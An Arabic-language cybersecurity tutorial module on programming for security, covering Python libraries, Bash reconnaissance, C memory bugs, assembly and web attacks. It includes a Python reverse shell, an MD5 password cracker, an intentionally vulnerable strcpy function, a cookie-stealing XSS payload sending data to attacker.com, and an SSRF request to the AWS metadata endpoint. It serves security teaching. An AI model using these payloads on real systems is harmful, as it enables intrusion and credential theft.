# 03 — البرمجة للأمن السيبراني

---

## لماذا البرمجة ضرورية في الأمن؟

- كتابة أدوات مخصصة واستغلالات (Exploits)
- أتمتة المهام المتكررة
- فهم كود البرمجيات الخبيثة
- تحليل الثغرات في الكود المصدري

---

## Python — اللغة الأولى للأمن

### المكتبات الأساسية

```python
# الشبكات
import socket          # اتصالات TCP/UDP
import scapy           # بناء وتحليل الحزم
import requests        # HTTP requests
import paramiko        # SSH

# التشفير
from cryptography.fernet import Fernet
import hashlib
import hmac

# تحليل البيانات
import struct          # Binary data
import base64
import binascii

# أتمتة الويب
from selenium import webdriver
import beautifulsoup4

# المكتبات المتخصصة للأمن
import impacket        # Windows protocols
import pwntools        # CTF و Exploit development
```

### أمثلة عملية

```python
# Port Scanner بسيط
import socket

def scan_port(host, port):
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect((host, port))
        return True
    except:
        return False

# Reverse Shell بسيط (للفهم فقط)
import socket, subprocess, os

def reverse_shell(host, port):
    s = socket.socket()
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

# Password Cracker (MD5)
import hashlib

def crack_md5(hash_to_crack, wordlist_path):
    with open(wordlist_path, 'r') as f:
        for word in f:
            word = word.strip()
            if hashlib.md5(word.encode()).hexdigest() == hash_to_crack:
                return word
    return None
```

---

## Bash Scripting

```bash
#!/bin/bash
# سكريبت استطلاع أساسي

TARGET=$1
echo "[*] Recon for: $TARGET"

echo "[*] DNS Lookup:"
dig +short $TARGET

echo "[*] Whois:"
whois $TARGET | grep -E "Registrar|Creation|Expiry"

echo "[*] Port Scan (Top 1000):"
nmap -T4 --top-ports 1000 $TARGET

echo "[*] HTTP Headers:"
curl -sI http://$TARGET | head -20
```

---

## C / C++ — فهم الـ Memory

```c
// فهم Buffer Overflow
#include <string.h>
#include <stdio.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // ⚠️ لا يتحقق من الطول — ثغرة!
    printf("Input: %s\n", buffer);
}

// Stack Layout أثناء الاستدعاء:
// [buffer 64 bytes][saved EBP][return address] ← الهدف
```

### مفاهيم C الحرجة للأمن

- **Stack vs Heap** — وأين تحدث الـ Overflows
- **Pointers** — Use-After-Free, Double Free
- **Format Strings** — `printf(user_input)` ← ثغرة خطيرة
- **Integer Overflow** — وكيف يُستغل

---

## Assembly (أساسي)

```asm
; x86-64 Assembly — أساسيات
; Registers الرئيسية
; RAX, RBX, RCX, RDX — للبيانات
; RSP — Stack Pointer
; RIP — Instruction Pointer (الهدف في Exploits)

; مثال: دالة بسيطة
push rbp
mov rbp, rsp
mov eax, 42      ; return 42
pop rbp
ret
```

### أدوات تحليل Assembly

```
gdb / pwndbg / peda    — Debuggers
radare2                — Reverse Engineering
ghidra                 — Decompiler (مجاني من NSA)
IDA Pro                — الأكثر احترافية (مدفوع)
```

---

## JavaScript — لأمن الويب

```javascript
// XSS Payload أساسي
<script>document.location='http://attacker.com/?c='+document.cookie</script>

// Prototype Pollution
obj.__proto__.admin = true

// SSRF عبر fetch
fetch('http://169.254.169.254/latest/meta-data/') // AWS Metadata
```

---

## ⏱️ الوقت المقدر: مستمر (تُحسّن مع الممارسة)

## مصادر
- [Automate the Boring Stuff with Python](https://automatetheboringstuff.com/)
- [pwntools Documentation](https://docs.pwntools.com/)
- كتاب: *Black Hat Python* - Justin Seitz
- كتاب: *Hacking: The Art of Exploitation* - Jon Erickson
